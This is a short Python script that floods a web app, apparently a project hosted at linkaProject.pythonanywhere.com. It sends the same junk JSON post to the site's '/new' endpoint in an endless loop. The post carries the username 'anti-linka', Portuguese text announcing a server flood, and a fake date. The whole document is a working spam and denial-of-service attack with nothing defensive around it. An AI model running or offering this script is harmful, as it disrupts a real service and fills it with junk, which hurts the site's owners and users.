import requests
while True:
    json_flood = {
        "username":"anti-linka",
        "text_post":"flood do servidor akakkaakakkakakakak",
        "datetime":"666/666/666"
    }
    requests.post("http://linkaProject.pythonanywhere.com/new", json_flood, timeout=5)
    print("ja foi mais um!")